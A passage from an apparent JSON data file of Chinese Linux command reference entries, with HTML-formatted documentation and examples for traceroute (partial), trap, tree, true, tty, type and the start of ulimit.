class=\"hljs-number\">6.198</span>)  <span class=\"hljs-number\">2.944</span> <span class=\"hljs-keyword\">ms</span> <span class=\"hljs-title\">61</span>.<span class=\"hljs-number\">148.156</span>.<span class=\"hljs-number\">6</span> (<span class=\"hljs-number\">61.148</span>.<span class=\"hljs-number\">156.6</span>)  <span class=\"hljs-number\">3.505</span> <span class=\"hljs-keyword\">ms</span> <span class=\"hljs-title\">123</span>.<span class=\"hljs-number\">126.6</span>.<span class=\"hljs-number\">198</span> (<span class=\"hljs-number\">123.126</span>.<span class=\"hljs-number\">6.198</span>)  <span class=\"hljs-number\">2.885</span> <span class=\"hljs-keyword\">ms</span>\n <span class=\"hljs-title\">9</span>  * * *\n<span class=\"hljs-number\">10</span>  * * *\n</code></pre>\n<p>其它一些实例</p>\n<pre><code class=\"language-shell\">traceroute -m <span class=\"hljs-number\">10</span> www.<span class=\"hljs-keyword\">baidu.com </span><span class=\"hljs-comment\"># 跳数设置</span>\ntraceroute -n www.<span class=\"hljs-keyword\">baidu.com </span>   <span class=\"hljs-comment\"># 显示IP地址，不查主机名</span>\ntraceroute -p <span class=\"hljs-number\">6888</span> www.<span class=\"hljs-keyword\">baidu.com </span> <span class=\"hljs-comment\"># 探测包使用的基本UDP端口设置6888</span>\ntraceroute -q <span class=\"hljs-number\">4</span> www.<span class=\"hljs-keyword\">baidu.com </span> <span class=\"hljs-comment\"># 把探测包的个数设置为值4</span>\ntraceroute -r www.<span class=\"hljs-keyword\">baidu.com </span>   <span class=\"hljs-comment\"># 绕过正常的路由表，直接发送到网络相连的主机</span>\ntraceroute -w <span class=\"hljs-number\">3</span> www.<span class=\"hljs-keyword\">baidu.com </span> <span class=\"hljs-comment\"># 把对外发探测包的等待响应时间设置为3秒</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "trap",
        "des": "捕捉信号和其他事件并执行命令。",
        "body": "<h1 id=\"trap\">trap</h1>\n<p>捕捉信号和其他事件并执行命令。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">trap <span class=\"hljs-comment\">[-lp]</span> <span class=\"hljs-comment\">[<span class=\"hljs-comment\">[arg]</span> signal_spec ...]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>用于指定在接收到信号后将要采取的动作。</li>\n<li>脚本程序被中断时执行清理工作。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-l    打印信号名称以及信号名称对应的数字。</span>\n<span class=\"hljs-deletion\">-p    显示与每个信号关联的trap命令。</span>\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>arg：接收到信号时执行的命令。</p>\n<p>signal_spec：信号名称或信号名称对应的数字。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>如果表达式执行结果为成功时返回0，当参数 <code>signal_spec</code> 没有指定有效值时返回1。</p>\n<h2 id=\"关于信号\">关于信号</h2>\n<p>信号是一种进程间通信机制，它给应用程序提供一种异步的软件中断，使应用程序有机会接受其他程序活终端发送的命令(即信号)。应用程序收到信号后，有三种处理方式：忽略，默认，或捕捉。进程收到一个信号后，会检查对该信号的处理机制。如果是SIG_IGN，就忽略该信号；如果是SIG_DFT，则会采用系统默认的处理动作，通常是终止进程或忽略该信号；如果给该信号指定了一个处理函数(捕捉)，则会中断当前进程正在执行的任务，转而去执行该信号的处理函数，返回后再继续执行被中断的任务。</p>\n<p>在有些情况下，我们不希望自己的shell脚本在运行时刻被中断，比如说我们写得shell脚本设为某一用户的默认shell，使这一用户进入系统后只能作某一项工作，如数据库备份， 我们可不希望用户使用 Ctrl+C 等方法进入到shell状态做我们不希望做的事情。这便用到了信号处理。</p>\n<p>以下是一些你可能会遇到的常见信号：</p>\n<table>\n<tbody>\n<tr>\n<th width=\"100\">信号名称</th>\n<th width=\"60\">信号数</th>\n<th>描述</th>\n</tr>\n<tr>\n<td>SIGHUP</td>\n<td>1</td>\n<td>本信号在用户终端连接（正常或非正常）结束时发出，通常是在终端的控制进程结束时，通知同一session内的各个作业，这时它们与控制终端不再关联。登录Linux时，系统会分配给登录用户一个终端(Session)。在这个终端运行的所有程序，包括前台进程组和后台进程组，一般都属于这个Session。当用户退出Linux登录时，前台进程组和后台有对终端输出的进程将会收到SIGHUP信号。这个信号的默认操作为终止进程，因此前台进程组和后台有终端输出的进程就会中止。对于与终端脱离关系的守护进程，这个信号用于通知它重新读取配置文件。</td>\n</tr>\n<tr>\n<td>SIGINT</td>\n<td>2</td>\n<td>程序终止(interrupt)信号，在用户键入 Ctrl+C 时发出。</td>\n</tr>\n<tr>\n<td>SIGQUIT</td>\n<td>3</td>\n<td>和SIGINT类似，但由QUIT字符(通常是Ctrl /)来控制。进程在因收到SIGQUIT退出时会产生core文件，在这个意义上类似于一个程序错误信号。</td>\n</tr>\n<tr>\n<td>SIGFPE</td>\n<td>8</td>\n<td>在发生致命的算术运算错误时发出。不仅包括浮点运算错误，还包括溢出及除数为0等其它所有的算术错误。</td>\n</tr>\n<tr>\n<td>SIGKILL</td>\n<td>9</td>\n<td>用来立即结束程序的运行。本信号不能被阻塞，处理和忽略。</td>\n</tr>\n<tr>\n<td>SIGALRM</td>\n<td>14</td>\n<td>时钟定时信号，计算的是实际的时间或时钟时间。alarm 函数使用该信号。</td>\n</tr>\n<tr>\n<td>SIGTERM</td>\n<td>15</td>\n<td>程序结束(terminate)信号, 与SIGKILL不同的是该信号可以被阻塞和处理. 通常用来要求程序自己正常退出；kill 命令缺省产生这个信号。</td>\n</tr>\n</tbody>\n</table>\n\n\n<h2 id=\"例子\">例子</h2>\n<p>当shell收到 <code>HUP INT PIPE QUIT TERM</code> 这几个命令时，当前执行的程序会执行 <code>exit 1</code>。</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@pc</span> root]$ trap <span class=\"hljs-string\">\"exit 1\"</span> HUP <span class=\"hljs-built_in\">INT</span> PIPE QUIT TERM\n</code></pre>\n<h3 id=\"1-清理临时文件\">1 清理临时文件</h3>\n<p>下面展示了如果有人试图从终端中止程序时，如何删除文件然后退出：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">trap</span> <span class=\"hljs-string\">\"rm -f <span class=\"hljs-variable\">$WORKDIR</span>/work1 <span class=\"hljs-variable\">$WORKDIR</span>/dataout; exit\"</span> 2\n</code></pre>\n<p>执行shell程序，如果程序接收信号为2，那么这两个文件 （work1 和 dataout） 将被自动删除。</p>\n<p>添加信号1 <code>SIGHUP</code>：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">$</span> <span class=\"hljs-keyword\">trap</span> <span class=\"hljs-string\">\"rm <span class=\"hljs-variable\">$WORKDIR</span>/work1 <span class=\"hljs-variable\">$WORKDIR</span>/dataout; exit\"</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">2</span>\n</code></pre>\n<h3 id=\"2-忽略信号\">2 忽略信号</h3>\n<p>如果陷阱列出的命令是空的，指定的信号接收时，将被忽略：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">$</span> <span class=\"hljs-keyword\">trap</span> <span class=\"hljs-string\">''</span> <span class=\"hljs-number\">2</span>\n</code></pre>\n<p>忽略多个信号：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">$</span> <span class=\"hljs-keyword\">trap</span> <span class=\"hljs-string\">''</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">2</span> <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">15</span>\n</code></pre>\n<h3 id=\"3-重置陷阱\">3 重置陷阱</h3>\n<p>当你改变了收到信号后采取的动作，你可以省略第一个参数来重置到默认行为。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">$</span> <span class=\"hljs-keyword\">trap</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">2</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><code>trap -l</code> 等价于执行 <code>kill -l</code>。</li>\n<li>发送信号请查看 <code>kill</code> 命令。</li>\n<li>该命令是bash内建命令，相关的帮助信息请查看 <code>help</code> 命令。</li>\n<li>建议您阅读以下参考资料来深入了解该命令：</li>\n</ol>\n<ul>\n<li><a href=\"https://www.gnu.org/software/bash/manual/html_node/Bourne-Shell-Builtins.html#index-trap\">GNU 官方手册： trap命令</a></li>\n<li><a href=\"https://blog.csdn.net/elbort/article/details/8525599\">Linux Shell的信号trap功能你必须知道的细节</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2019/12/mktemp.html\">阮一峰： Bash 脚本如何创建临时文件：mktemp 命令和 trap 命令教程</a></li>\n<li><a href=\"https://blog.csdn.net/iEearth/article/details/52612557\">【Bash百宝箱】shell内建命令之trap</a></li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "tree",
        "des": "树状图列出目录的内容",
        "body": "<h1 id=\"tree\">tree</h1>\n<p>树状图列出目录的内容</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>tree命令</strong> 以树状图列出目录的内容。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">tree</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>------ 列表选项 -------\n<span class=\"hljs-literal\">-</span>a            <span class=\"hljs-comment\"># 显示所有文件和目录。</span>\n<span class=\"hljs-literal\">-</span>d            <span class=\"hljs-comment\"># 显示目录名称而非文件。</span>\n<span class=\"hljs-literal\">-</span>l            <span class=\"hljs-comment\"># 如遇到性质为符号连接的目录，直接列出该连接所指向的原始目录。</span>\n<span class=\"hljs-literal\">-</span>f            <span class=\"hljs-comment\"># 在每个文件或目录之前，显示完整的相对路径名称。</span>\n<span class=\"hljs-literal\">-</span>x            <span class=\"hljs-comment\"># 将范围局限在现行的文件系统中，若指定目录下的某些子目录，其存放于另一个文件系统上，则将该目录予以排除在寻找范围外。</span>\n<span class=\"hljs-literal\">-</span>L level      <span class=\"hljs-comment\"># 限制目录显示层级。</span>\n<span class=\"hljs-literal\">-</span>R            <span class=\"hljs-comment\"># Rerun tree when max dir level reached.</span>\n<span class=\"hljs-literal\">-</span>P pattern    <span class=\"hljs-comment\"># &lt;范本样式&gt; 只显示符合范本样式的文件和目录名称。</span>\n<span class=\"hljs-literal\">-</span>I pattern    <span class=\"hljs-comment\"># Do not list files that match the given pattern.</span>\n<span class=\"hljs-literal\">-</span>-ignore-case <span class=\"hljs-comment\"># Ignore case when pattern matching.</span>\n<span class=\"hljs-literal\">-</span>-matchdirs   <span class=\"hljs-comment\"># Include directory names in -P pattern matching.</span>\n<span class=\"hljs-literal\">-</span>-noreport    <span class=\"hljs-comment\"># Turn off file/directory count at end of tree listing.</span>\n<span class=\"hljs-literal\">-</span>-charset X   <span class=\"hljs-comment\"># Use charset X for terminal/HTML and indentation line output.</span>\n<span class=\"hljs-literal\">-</span>-filelimit <span class=\"hljs-comment\"># # Do not descend dirs with more than # files in them.</span>\n<span class=\"hljs-literal\">-</span>-timefmt &lt;f&gt; <span class=\"hljs-comment\"># Print and format time according to the format &lt;f&gt;.</span>\n<span class=\"hljs-literal\">-</span>o filename   <span class=\"hljs-comment\"># Output to file instead of stdout.</span>\n<span class=\"hljs-literal\">-</span>------- 文件选项 ---------\n<span class=\"hljs-literal\">-</span>q            <span class=\"hljs-comment\"># 用“？”号取代控制字符，列出文件和目录名称。</span>\n<span class=\"hljs-literal\">-</span>N            <span class=\"hljs-comment\"># 直接列出文件和目录名称，包括控制字符。</span>\n<span class=\"hljs-literal\">-</span>Q            <span class=\"hljs-comment\"># Quote filenames with double quotes.</span>\n<span class=\"hljs-literal\">-</span>p            <span class=\"hljs-comment\"># 列出权限标示。</span>\n<span class=\"hljs-literal\">-</span>u            <span class=\"hljs-comment\"># 列出文件或目录的拥有者名称，没有对应的名称时，则显示用户识别码。</span>\n<span class=\"hljs-literal\">-</span>g            <span class=\"hljs-comment\"># 列出文件或目录的所属群组名称，没有对应的名称时，则显示群组识别码。</span>\n<span class=\"hljs-literal\">-</span>s            <span class=\"hljs-comment\"># 列出文件和目录大小。</span>\n<span class=\"hljs-literal\">-</span>h            <span class=\"hljs-comment\"># Print the size in a more human readable way.</span>\n<span class=\"hljs-literal\">-</span>-si          <span class=\"hljs-comment\"># Like -h, but use in SI units (powers of 1000).</span>\n<span class=\"hljs-literal\">-</span>D            <span class=\"hljs-comment\"># 列出文件或目录的更改时间。</span>\n<span class=\"hljs-literal\">-</span>F            <span class=\"hljs-comment\"># 在执行文件，目录，Socket，符号连接，管道名称名称，各自加上\"*\"，\"/\"，\"@\"，\"|\"号。</span>\n<span class=\"hljs-literal\">-</span>-inodes      <span class=\"hljs-comment\"># Print inode number of each file.</span>\n<span class=\"hljs-literal\">-</span>-device      <span class=\"hljs-comment\"># Print device ID number to which each file belongs.</span>\n<span class=\"hljs-literal\">-</span>------ 排序选项 -------\n<span class=\"hljs-literal\">-</span>v            <span class=\"hljs-comment\"># Sort files alphanumerically by version.</span>\n<span class=\"hljs-literal\">-</span>t            <span class=\"hljs-comment\"># 用文件和目录的更改时间排序。</span>\n<span class=\"hljs-literal\">-</span>c            <span class=\"hljs-comment\"># Sort files by last status change time.</span>\n<span class=\"hljs-literal\">-</span>U            <span class=\"hljs-comment\"># Leave files unsorted.</span>\n<span class=\"hljs-literal\">-</span>r            <span class=\"hljs-comment\"># Reverse the order of the sort.</span>\n<span class=\"hljs-literal\">-</span>-dirsfirst   <span class=\"hljs-comment\"># List directories before files (-U disables).</span>\n<span class=\"hljs-literal\">-</span>-sort X      <span class=\"hljs-comment\"># Select sort: name,version,size,mtime,ctime.</span>\n<span class=\"hljs-literal\">-</span>------ 图形选项 ------\n<span class=\"hljs-literal\">-</span>i            <span class=\"hljs-comment\"># 不以阶梯状列出文件和目录名称。</span>\n<span class=\"hljs-literal\">-</span>A            <span class=\"hljs-comment\"># 使用ASNI绘图字符显示树状图而非以ASCII字符组合。</span>\n<span class=\"hljs-literal\">-</span>S            <span class=\"hljs-comment\"># Print with CP437 (console) graphics indentation lines.</span>\n<span class=\"hljs-literal\">-</span>n            <span class=\"hljs-comment\"># Turn colorization off always (-C overrides).</span>\n<span class=\"hljs-literal\">-</span>C            <span class=\"hljs-comment\"># 在文件和目录清单加上色彩，便于区分各种类型。</span>\n<span class=\"hljs-literal\">-</span>------ XML / HTML / JSON选项 -------\n<span class=\"hljs-literal\">-</span>X            <span class=\"hljs-comment\"># Prints out an XML representation of the tree.</span>\n<span class=\"hljs-literal\">-</span>J            <span class=\"hljs-comment\"># Prints out an JSON representation of the tree.</span>\n<span class=\"hljs-literal\">-</span>H baseHREF   <span class=\"hljs-comment\"># Prints out HTML format with baseHREF as top directory.</span>\n<span class=\"hljs-literal\">-</span>T string     <span class=\"hljs-comment\"># Replace the default HTML title and H1 header with string.</span>\n<span class=\"hljs-literal\">-</span>-nolinks     <span class=\"hljs-comment\"># Turn off hyperlinks in HTML output.</span>\n<span class=\"hljs-literal\">-</span>--- 杂项选项 ----\n<span class=\"hljs-literal\">-</span>-version     <span class=\"hljs-comment\"># 输入版本信息。</span>\n<span class=\"hljs-literal\">-</span>-help        <span class=\"hljs-comment\"># 打印使用帮助信息。</span>\n<span class=\"hljs-literal\">-</span>-            <span class=\"hljs-comment\"># Options processing terminator.</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>目录：执行tree指令，它会列出指定目录下的所有文件，包括子目录里的文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>列出目录<code>/private/</code> 第一级文件名</p>\n<pre><code class=\"language-shell\">tree  <span class=\"hljs-regexp\">/private/</span> -L <span class=\"hljs-number\">1</span>\n<span class=\"hljs-regexp\">/private/</span>\n├── etc\n├── tftpboot\n├── tmp\n└── var\n</code></pre>\n<p>忽略文件夹</p>\n<pre><code class=\"language-shell\">tree -I node_modules <span class=\"hljs-comment\"># 忽略当前目录文件夹node_modules</span>\ntree -P node_modules <span class=\"hljs-comment\"># 列出当前目录文件夹node_modules的目录结构</span>\ntree -P node_modules -L <span class=\"hljs-number\">2</span> <span class=\"hljs-comment\"># 显示目录node_modules两层的目录树结构</span>\ntree -L <span class=\"hljs-number\">2</span> &gt; <span class=\"hljs-regexp\">/home/</span>www/tree.txt <span class=\"hljs-comment\"># 当前目录结果存到 tree.txt 文件中</span>\n</code></pre>\n<p>忽略多个文件夹</p>\n<pre><code class=\"language-shell\">tree -I 'node_modules|<span class=\"hljs-type\">icon</span>|<span class=\"hljs-type\">font</span>' -L <span class=\"hljs-number\">2</span>\n</code></pre>\n<p>非树状结构列出目录<code>/private/</code>下的所有文件</p>\n<pre><code>tree -<span class=\"hljs-keyword\">if</span> <span class=\"hljs-regexp\">/private/</span>\n/<span class=\"hljs-keyword\">private</span>\n<span class=\"hljs-regexp\">/private/</span>a1\n<span class=\"hljs-regexp\">/private/</span>a2\n<span class=\"hljs-regexp\">/private/</span>etc\n<span class=\"hljs-regexp\">/private/</span>etc/b1\n<span class=\"hljs-regexp\">/private/</span>etc/b2\n<span class=\"hljs-regexp\">/private/</span>tftpboot\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "true",
        "des": "返回状态为成功。",
        "body": "<h1 id=\"true\">true</h1>\n<p>返回状态为成功。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">true</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>用于和其他命令进行逻辑运算。</li>\n</ul>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回状态总是成功；返回值为0。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 当你的脚本设置set -e时，任何返回值为失败的命令都会使得脚本退出。</span>\n<span class=\"hljs-keyword\">set</span> -e\n<span class=\"hljs-comment\"># 如何临时跳过呢？下面的语句使用逻辑或操作符连接true，返回值一定为真。</span>\nsome_<span class=\"hljs-keyword\">command</span> || <span class=\"hljs-literal\">true</span>\n\n<span class=\"hljs-comment\"># 当然，和python的pass一样，也可以用作条件语句临时占位。</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "tty",
        "des": "显示连接到当前标准输入的终端设备文件名",
        "body": "<h1 id=\"tty\">tty</h1>\n<p>显示连接到当前标准输入的终端设备文件名</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">tty [option] ...\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>显示连接到当前标准输入的终端设备文件名，当标准输入不是终端时打印 \"not a tty\"。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">s</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">silent</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">quiet</span>    <span class=\"hljs-comment\">不打印任何信息，只返回退出状态。</span>\n--<span class=\"hljs-comment\">help</span>                   <span class=\"hljs-comment\">显示帮助信息并退出。</span>\n--<span class=\"hljs-comment\">version</span>                <span class=\"hljs-comment\">显示版本信息并退出。</span>\n</code></pre>\n<h2 id=\"返回值\">返回值</h2>\n<p>当使用 <code>-s, --silent, --quiet</code> 时，返回码为 0 表示标准输入是终端，返回码为 1 表示标准输入不是终端，返回码为 2 表示选项错误，返回码为 3 表示有写错误发生。</p>\n<h2 id=\"例子\">例子</h2>\n<p>显示连接到当前标准输入的终端设备文件名。</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># tty</span>\n<span class=\"hljs-regexp\">/dev/</span>pts/<span class=\"hljs-number\">2</span>\n</code></pre>\n<p>查找终端关联的进程（假设是 pts/2）</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 注意是筛选 TTY 列。</span>\nps -ef | egrep <span class=\"hljs-string\">\"pts/2 \"</span> | <span class=\"hljs-keyword\">grep</span> -v <span class=\"hljs-keyword\">grep</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 tty</code>，<code>info coreutils 'tty invocation'</code>。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "type",
        "des": "显示指定命令的类型。",
        "body": "<h1 id=\"type\">type</h1>\n<p>显示指定命令的类型。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\"> <span class=\"hljs-keyword\">type</span> [-afptP] <span class=\"hljs-keyword\">name</span> [<span class=\"hljs-keyword\">name</span> ...]\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>显示要查找的命令的信息。</li>\n<li>控制查找范围和行为。</li>\n<li>显示要查找的命令优先级最高的类型。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\">-a：在环境变量<span class=\"hljs-type\">PATH</span>中查找并显示所有包含<span class=\"hljs-type\">name</span>的可执行文件路径；当<span class=\"hljs-string\">'-p'</span>选项没有同时给出时，如果在别名、关键字，函数，内建的信息中存在<span class=\"hljs-type\">name</span>，则一并显示。\n-f：排除对shell函数的查找。\n-p：如果<span class=\"hljs-type\">name</span>在执行<span class=\"hljs-string\">'type -t name'</span>返回的不是<span class=\"hljs-string\">'file'</span>，那么什么也不返回；否则会在环境变量<span class=\"hljs-type\">PATH</span>中查找并返回可执行文件路径。\n-P：即使要查找的<span class=\"hljs-type\">name</span>是别名、内建、函数中的一个，仍然会在环境变量<span class=\"hljs-type\">PATH</span>中查找并返回可执行文件路径。\n-t：根据<span class=\"hljs-type\">name</span>的类型返回一个单词（别名，关键字，函数，内建，文件），否则返回空值。\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>name：要查找的命令，可以为多个。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>当指定的命令可以找到时返回成功，如果有没找到的返回失败。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\">接下来要用到的例子假设'~<span class=\"hljs-string\">/.bashrc</span>'文件定义了以下的内容：\n\n<span class=\"hljs-keyword\">alias</span> <span class=\"hljs-keyword\">ls</span>='<span class=\"hljs-keyword\">ls</span> <span class=\"hljs-params\">--color=auto</span>'\nmybash<span class=\"hljs-params\">()</span>{ vim ~<span class=\"hljs-string\">/.bashrc</span>; }\n\n而且执行环境里没有使用enable禁用内建命令。\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">type</span> -a mybash</span>\n<span class=\"hljs-meta\"># 输出</span>\n<span class=\"hljs-title\">mybash</span> is a function\n<span class=\"hljs-title\">mybash</span> ()\n{\n    vim ~/.bashrc\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">type</span> -a -f mybash</span>\n<span class=\"hljs-meta\"># 输出（因为排除了函数，所以报错）</span>\n<span class=\"hljs-title\">bash</span>: <span class=\"hljs-class\"><span class=\"hljs-keyword\">type</span>: mybash: not found</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">type</span> -a -p mybash</span>\n<span class=\"hljs-meta\"># 输出为空（因为排除了函数，所以什么也不返回）</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">type</span> -a ls</span>\n<span class=\"hljs-meta\"># 输出</span>\n<span class=\"hljs-title\">ls</span> is aliased to `ls <span class=\"hljs-comment\">--color=suto'</span>\n<span class=\"hljs-title\">ls</span> is /usr/bin/ls\n<span class=\"hljs-title\">ls</span> is /bin/ls\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">type</span> -a -p ls</span>\n<span class=\"hljs-meta\"># 输出</span>\n/usr/bin/ls\n/bin/ls\n</code></pre>\n<pre><code class=\"language-shell\"># <span class=\"hljs-string\">'-f'</span>不会影响<span class=\"hljs-string\">'-P'</span>的范围，<span class=\"hljs-string\">'-f'</span>不建议和<span class=\"hljs-string\">'-p'</span>使用。\n# 注意：<span class=\"hljs-built_in\">printf</span>同时是内建命令以及可执行文件（GNU coreutils），优先作为内建处理。\n\n<span class=\"hljs-built_in\">type</span> -<span class=\"hljs-keyword\">p</span> <span class=\"hljs-built_in\">printf</span>\n# 输出为空\n\n<span class=\"hljs-built_in\">type</span> -<span class=\"hljs-keyword\">P</span> <span class=\"hljs-built_in\">printf</span>\n# 输出\n/usr/bin/<span class=\"hljs-built_in\">printf</span>\n/bin/<span class=\"hljs-built_in\">printf</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># 如果有多个类型，那么输出优先级最高的类型。</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">type</span> -t ls</span>\n<span class=\"hljs-meta\"># 输出</span>\n<span class=\"hljs-title\">alias</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">type</span> -t for</span>\n<span class=\"hljs-meta\"># 输出（bash关键字）</span>\n<span class=\"hljs-title\">keyword</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">type</span> -t mybash</span>\n<span class=\"hljs-meta\"># 输出</span>\n<span class=\"hljs-title\">function</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">type</span> -t -f mybash</span>\n<span class=\"hljs-meta\"># 输出空值</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">type</span> -t printf</span>\n<span class=\"hljs-meta\"># 输出（bash内建优先级高）</span>\n<span class=\"hljs-title\">builtin</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">type</span> -t chmod</span>\n<span class=\"hljs-meta\"># 输出</span>\n<span class=\"hljs-title\">file</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><p>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</p>\n</li>\n<li><p>命令优先级问题请查看<code>builtin</code>命令。</p>\n</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "ulimit",
        "des": "控制shell程序的资源",
        "body": "<h1 id=\"ulimit\">ulimit</h1>\n<p>控制shell程序的资源</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ulimit命令</strong> 用来限制系统用户对shell资源的访问。如果不懂什么意思，下面一段内容可以帮助你理解：</p>\n<p>假设有这样一种情况，当一台 Linux 主机上同时登陆了 10 个人，在系统资源无限制的情况下，这 10 个用户同时打开了 500 个文档，而假设每个文档的大小有 10M，这时系统的内存资源就会受到巨大的挑战。</p>\n<p>而实际应用的环境要比这种假设复杂的多，例如在一个嵌入式开发环境中，各方面的资源都是非常紧缺的，对于开启文件描述符的数量，分配堆栈的大 小，CPU 时间，虚拟内存大小，等等，都有非常严格的要求。资源的合理限制和分配，不仅仅是保证系统可用性的必要条件，也与系统上软件运行的性能有着密不可分的联 系。这时，ulimit 可以起到很大的作用，它是一种简单并且有效的实现资源限制的方式。</p>\n<p>ulimit 用于限制 shell 启动进程所占用的资源，支持以下各种类型的限制：所创建的内核文件的大小、进程数据块的大小、Shell 进程创建文件的大小、内存锁住的大小、常驻内存集的大小、打开文件描述符的数量、分配堆栈的最大大小、CPU 时间、单个用户的最大线程数、Shell 进程所能使用的最大虚拟内存。同时，它支持硬资源和软资源的限制。</p>\n<p>作为临时限制，ulimit 可以作用于通过使用其命令登录的 shell 会话，在会话终止时便结束限制，并不影响于其他 shell 会话。而对于长期的固定限制，ulimit 命令语句又可以被添加到由登录 shell 读取的文件中，作用于特定的 shell 用户。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ulimit</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：显示目前资源限制的设定；</span>\n<span class=\"hljs-deletion\">-c &lt;core文件上限&gt;：设定core文件的最大值，单位为区块；</span>\n<span class=\"hljs-deletion\">-d &lt;数据节区大小&gt;：程序数据节区的最大值，单位为KB；</span>\n<span class=\"hljs-deletion\">-e 默认进程优先级, 值越小优先级越高</span>\n<span class=\"hljs-deletion\">-f &lt;文件大小&gt;：shell所能建立的最大文件，单位为区块；</span>\n<span class=\"hljs-deletion\">-H：设定资源的硬性限制，也就是管理员所设下的限制；</span>\n<span class=\"hljs-deletion\">-m &lt;内存大小&gt;：指定可使用内存的上限，单位为KB；</span>\n<span class=\"hljs-deletion\">-n &lt;文件数目&gt;：指定同一时间最多可开启的文件数；</span>\n<span class=\"hljs-deletion\">-p &lt;缓冲区大小&gt;：指定管道缓冲区的大小，单位512字节；</span>\n<span class=\"hljs-deletion\">-s &lt;堆叠大小&gt;：指定堆叠的上限，单位为KB；</span>\n<span class=\"hljs-deletion\">-S：设定资源的弹性限制；</span>\n<span class=\"hljs-deletion\">-t &lt;CPU时间&gt;：指定CPU使用时间的上限，单位为秒；</span>\n<span class=\"hljs-deletion\">-u &lt;程序数目&gt;：用户最多可开启的程序数目；</span>\n<span class=\"hljs-deletion\">-v 